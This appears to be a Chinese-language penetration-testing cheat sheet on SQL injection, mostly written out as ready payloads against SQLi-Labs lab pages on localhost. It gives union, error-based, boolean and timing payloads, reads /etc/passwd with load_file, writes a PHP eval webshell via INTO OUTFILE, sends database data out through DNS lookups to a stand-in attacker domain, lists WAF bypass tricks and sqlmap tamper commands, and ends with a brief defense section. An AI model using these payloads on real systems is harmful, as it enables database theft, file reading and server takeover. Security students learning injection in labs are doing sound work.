# 4、SQL注入

SQL注入是直接面对数据库进行攻击的。主要有以下几种危害：

1.权限较大情况下，可以通过SQL注入直接写入webshell或者直接执行系统命令。

2.权限较小情况下，可通过注入获得管理员权限、拖库等等

**易发问题点**

SQL注入经常出现在登陆页面、获取HTTP头（user-agent/client-ip等）、订单处理等地方。登陆页面主要发生在HTTP头中的client-ip和x-forward-for，这些一般用来记录登陆的ip。

**注入类型**

- 回显注入
- 报错注入
- Boolean盲注
- Timing盲注

## MySQL

### **MySQL内置函数**

```
version()                版本
database()               数据名
user() 
current_user()           当前登录用户
@@datadir                数据库路径
@@basedir                mysql安装路径
@@version_compile_os     操作系统
concat_ws()              将多个字符串连接成一个字符串     
```

### **SQL注入常见后台拼接语句**

```
1.$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;（需闭合’）
2.$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;
3.$sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”;（需闭合’））
4.$id = ‘”’ . $id . ‘”’;
  $sql=”SELECT * FROM users WHERE id=($id) LIMIT 0,1”;
  即$sql=”SELECT * FROM users WHERE id=(“$id”) LIMIT 0,1”;(需闭合”),此时你输入’不会报错)
5.$sql=”SELECT * FROM users WHERE id=((‘$id’)) LIMIT 0,1”;（少见）
```

### **MySQL5注入枚举数据库步骤**

```
# 获取数据库
select * from users where id='1' and 1=2 union select 1,schema_name,3 from information_schema.schemata limit 0（开始的记录，0为第一个开始记录）,1（显示1条记录）--+

# 获取表名

select * from users where id='1' and 1=2 union select 1,2,table_name from information_schema.tables where table_schema='数据库名字'（最常用的是十六进制表示的数据库,’容易被过滤） limit 3,1--+


# 获取列名

select * from users where id='1' and 1=2 union select 1,2,column_name from information_schema.columns where table_schema=0x十六进制数据库 and table_name=0x十六进制表 limit 0,1--+

# 获取内容

select * from users where id='1' and 1=2 union select 1,2,concat_ws(char(32,58,32),username,password)(concat_ws用法：分割符，列名) from users(表名) limit 0,1--+

ascii码中32是空格，58是：
```

### **注入方式**

- 回显注入

有回显，可以看到某些字段的回显结果（通常）

猜解出字段数目

最方便的注入方式就是使用Union语句填充查询结果，额外执行一次查询

```
select * from news where id = 1 union select 1,2,3,4;
```

- 报错注入

无正常回显时报错注入。

```
# floor() 语句:

and (select 1 from (select count(*),concat(char(0x7E),(select user()),char(0x7E),floor(rand(0)*2))x from information_schema.tables group by x)a)--+

# updatexml() 语句:

and (updatexml(1,concat(0x3a,(select user())),1));

# ExtractValue() 和upadtexml()用法差不多语句:

and extractvalue(1, concat(0x5c, (select user())));

```

- Boolean盲注

在没有数据回显的情况下，可以存在不同的页面内容回显

通常逐个爆破猜解，效率偏低

思路：利用回显的不同推测SQL语句执行的结果是True还是False


```
# SQLi-Labs Less 11 Payload：

admin' and password>'adm123'


# HTTP REQUEST

POST /Less-11/ HTTP/1.1
Host: localhost
Content-Length: 67
Cache-Control: max-age=0
Origin: http://localhost
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://localhost/Less-11/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

uname=admin' and password>'adm§123§'#&passwd=asd&submit=Submit


# 实际执行

SELECT username, password FROM users WHERE username='admin' and password>'ad8'#' and password='asd' LIMIT 0,1
```

- Timing盲注

页面不存在不同回显，但SQL语句被执行

逐个爆破猜解+时间延迟，效率最低

利用：if (query=True) delay(1000);else pass;的程序逻辑，通过观察是否发生了时间延迟来推测SQL语句的执行情况是否为True

**payload：**

```
If(ascii(substr(database(),1,1))>115,0,sleep(5))%23 //if 判断语句，条件为假，执行sleep
```
**截取字符串相关函数:**

```
length(str)：返回str字符串的长度。
substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始
mid(str,pos,len):跟上面的一样，截取字符串
ascii(str)：返回字符串str的最左面字符的ASCII代码值。
ord(str):同上，返回ascii码
if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返回0
left(database(),1) 取database字符串的左边第一个无法报错注入，尝试盲注
```

**SQL注入示例**

- **SQLi-Labs Less1 测试Payload**

```
# 测试Pyaload

' and 1=1
‘ and 1=2
') and 1=1
'--+
"--+
'/**/and/**/1=1%23


# 读取数据库
http://localhost//Less-1/index.php?id=1' and 1=2 union select 1,2,schema_name from information_schema.schemata limit 0,1 %23


+--------------------+
| Database           |
+--------------------+
| information_schema |
| challenges         |
| mysql              |
| performance_schema |
| security           |
| test               |
+--------------------+


# 读取数据库表名

http://localhost//Less-1/index.php?id=1' and 1=2 union select 1,2,table_name from information_schema.tables where table_schema='security' limit 0,1 %23

+--------------------+
| Tables_in_security |
+--------------------+
| emails             |
| referers           |
| uagents            |
| users              |
+--------------------+

# 获取列名

http://localhost//Less-1/index.php?id=1' and 1=2 union select 1,2,column_name from information_schema.columns where table_name='users' limit 0,1--+

+----+----------+----------+
| id | username | password |
+----+----------+----------+


# 获取内容

http://localhost//Less-1/index.php?id=1' and 1=2 union select 1,2,concat_ws(char(32,58,32),username,password) from users limit 0,1--+


# 报错注入

http://localhost//Less-1/index.php?id=1' and (updatexml(1,concat(0x7e,(select user())),1)) %23

http://localhost//Less-1/index.php?id=1' and (updatexml(1,concat(0x7e,(select username from users limit 2,1)),1)) %23

```

### **文件读写**

读取敏感文件，权限较大时，可以直接写shell

- 函数说明

```
@@basedir        获取MySQL位置
load_file（）    :读取文件
into dumpfile（）:导出文件
into outfile（） :导出文件
```

- 测试语句

```
# 先尝试能否获得路径，不能的话，就尝试常用的路径

http://localhost/Less-1/index.php?id=1' and 1=2 union select 1,2,@@basedir%23 

# 读取密码文件 

http://localhost/Less-1/index.php?id=1' and 1=2 union select 1,2,load_file(‘/etc/passwd’)%23

# 变换形式 - ascii编码 

- 转换方法

mysql> select conv(hex('D'),16,10);
+----------------------+
| conv(hex('D'),16,10) |
+----------------------+
| 68                   |
+----------------------+
1 row in set (0.00 sec)


- 转换形式 解码

mysql> select char(68,58,92,92,84,69,83,84,46,116,120,116);
+----------------------------------------------+
| char(68,58,92,92,84,69,83,84,46,116,120,116) |
+----------------------------------------------+
| D:\\TEST.txt                                 |
+----------------------------------------------+

- Payload

http://localhost/Less-1/index.php?id=1' and 1=2 union select 1,2,load_file(char(68,58,92,92,84,69,83,84,46,116,120,116))%23



# 变换形式 - hex编码 

- 转换方法

mysql> select hex("D:\\test.txt");
+------------------------+
| hex("D:\\test.txt")    |
+------------------------+
| 443A5C746573742E747874 |
+------------------------+
1 row in set (0.00 sec)


- 转换形式  解码

mysql> SELECT X'443A5C746573742E747874';
+---------------------------+
| X'443A5C746573742E747874' |
+---------------------------+
| D:\test.txt               |
+---------------------------+
1 row in set (0.00 sec)


- Payload

16进制编码导出文件内容到网页可访问页面，从而获取数据

http://localhost/Less-1/index.php?id=1'/**/and/**/1=2/**/union/**/select/**/1,load_file(0x443A5C746573742E747874)%23

```

- 写文件

file_name处要指定绝对路径，否则就会导出到mysql的目录下。同时对需导出的目录有可写权限。

```
SELECT * INTO OUTFILE 'file_name’

SELECT * INTO DUMPFILE ‘file_name’
```

获取Webshell的前提是知道网站的绝对物理路径，这样导出后的webshell可访问

```
select "<?php eval($_POST['z']);?>" into outfile'D:/web/shell.php';

# Tips:

secure-file-priv这个参数限制了outfile、dumpfile的导入导出权限。使用show命令可以看到secure_file_priv的配置。

mysql> show global variables like '%secure%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_auth      | OFF   |
| secure_file_priv | NULL  |
+------------------+-------+


- 当Null的时候，表示限制MySQL的导入|导出
- 当为某个根目录的时候，表示限制为只能在指定目录导入|导出
- 当没有具体值得时候，表示不对导入|导出的目录限制

```

**Waf绕过**

- 双写关键字

```
# 应对

简单的将select、or等关键字替换为空字符串的防御

# payload

seselectlectfrom 、where username='x' OorR1=1

```
- 大小写绕过

```
# 应对

简单的区分大小写的关键字匹配，比如php中preg_match函数没有加/i参数

# payload

SelecT，Or

```

- 编码绕过

```
•ASCII：

例如admin可以用char(97)+char(100)+char(109)+char(105)+char(110)代替

select * from users where username=(char(97)+char(100)+char(109)+char(105)+char(110))
select * from users where username=char(97,100,109,105,110);

•16进制：

mysql> select extractvalue(0x3C613E61646D696E3C2F613E,0x2f61);
+-------------------------------------------------+
| extractvalue(0x3C613E61646D696E3C2F613E,0x2f61) |
+-------------------------------------------------+
| admin                                           |
+-------------------------------------------------+
1 row in set (0.00 sec)

•unicode编码：

单引号——%u0027 、%u02b9、%u02bc、%u02c8、%u2032、%uff07

•URL编码：

or 1=1——%6f%72%20%31%3d%31

```

- 变换关键字绕过

```
Or    <------------>  ||、and  <--------> &&

空格被限制：select(username)from(admin)

科学计数法绕过：where username=1e1union select

mysql> select * FROM users where username=1e1union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+

 =、<、>被限制：where id in (1,2)、where id between 1 and 3、like

access中使用dlookup绕过select from被限制：(user=12',info=dlookup('[user]','userinfo','[id]=1')%00)
```

- 特殊字符

```
空格被限制：/**/、%a0、%0a、%0d、%09、tab....

内联注释：select 1 from /*!admin*/ /*!union*/ select 2,

mysql> select * FROM users where id = 1 /*!and 1=2*/ /*!union*/ select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
1 row in set (0.00 sec)

MYSQL对%00不会截断：se%00lect

单一%号，在asp+iis中会被忽略：sel%ect

``mysql反引号之间的会被当做注释内容
```

- 二次注入

攻击者将恶意SQL语句插入到数据库中，程序对数据库内容毫无防备，直接带入查询。

对来自于内部的输入输出过于信任。

- 宽字节

很多程序使用gbk编码的情况下，和unicode编码的组成形式不同造成这样的漏洞。

当数据库使用了宽字符集（如GBK），会将一些两个字符单做一个字符，如：0xbf27、0xbf5c

反斜杠是0x5c，使用addslashes()等转义函数在处理输入时会将'、\、”这些字符用反斜杠转义，输入0xbf27，转以后变成了0xbf5c27，5c被当做了汉字一部分，单引号0x27逃逸出来。前提条件是前一个ascii码要大于128，才到汉字的范围。

```
# SQLi-Labs Less32测试语句
http://localhost/Less-32/index.php?id=1%df%27 and 1=2 union select 1,2,3--+

以上语句在MySQL中查询其实已经变成了一个汉字，单引号逃逸了出来。因为’被转义成\’，而前面的%df与转义符号\(%5c)组合成了%df%5c,即運字。从而吃掉了\，导致单引号可以闭合

# 实际查询语句

SELECT * FROM users WHERE id='1運' and 1=2 union select 1,2,3-- ' LIMIT 0,1
```
- DNS传输

SQL Server的DNS注入和MySQl稍有不容,但都是利用了SMB协议。其中的.hacker.site是搭建的DNS域名服务器的地址。

> http://ceye.io 是提供DNS传输服务的网址。

```
select load_file(concat('\\',version(),'.hacker.site\a.txt')); 
select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874));
```



### **SQLMAP常用参数**

- POST注入

```
python sqlmap.py -r ~/Desktop/sqlmap.txt --level 3 --risk 3
```

```
python sqlmap.py -u "http://localhost//Less-11//index.php" --data="uname=admin&passwd=11" --level 3 --risk 3
```

- 读取文件

```
sqlmap.py -u "http://localhost/vulnerabilities/fu1.php?id=1" --level 5 --risk 3 --file-read /tmp/key 
```

- temper组合使用

```
python sqlmap.py -u "http://localhost//Less-11//index.php" --data="uname=admin&passwd=11" --level 3 --risk 3 -v --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py


# 读取库、表、列
sqlmap.py -u "" --dbs --level 5 --risk 3 -v 3 --tamper tamper/radomcase.py,tamper/space2comment.py,tamper/space2mysqldash.py --technique BEST --threads 10

# 读取文件
sqlmap.py -u "" --file-read "" --tamper tamper/radomcase.py,tamper/space2comment.py,tamper/space2mysqldash.py --technique BEST --threads 10
```

- space2comment.py：空格转/**/的形式注入。
- radomcase.py：大小写变换
- space2mysqldash.py：变换关键字

**手动绕过**

多个关键字替换

```
http://localhost//vulnerabilities/fu1.php?id=1%27)/**/anandd/**/1=2/**/uniunionon/**/select/**/1,2,load_file(%27/tmp/360/key%27),4%23

http://localhost//vulnerabilities/fu1.php?id=1%27)/**/anandd/**/1=2/**/uunionnion/**/select/**/1,2,3,4,5,6,7/**/anandd/**/(%27

http://localhost/vulnerabilities/fu1.php?id=1')/**/aandnd/**/1=2/**/uunionnion/**/select/**/1,2,load_file('/etc/passwd'),4,5,6,7/**/anandd/**/('
```

### **SQL注入防御**

字符串拼接形式：

```
过滤单引号、双引号、反斜杠等等关键词

转义：addslashes、mysqli_real_escape_string
```

使用pdo：

在PHP5.3.6及以下版本需要设置setAttribute(PDO::ATTR_EMULATE_PREPARES,false);来禁用preparedstatement仿真效果



### 技巧搜集

[一次挖洞中失去工具的union盲注？](https://xz.aliyun.com/t/3489)



## PHP代码审计

[PbootCMS代码审计全过程之三-漏洞测试-sql注入](https://xz.aliyun.com/t/3532)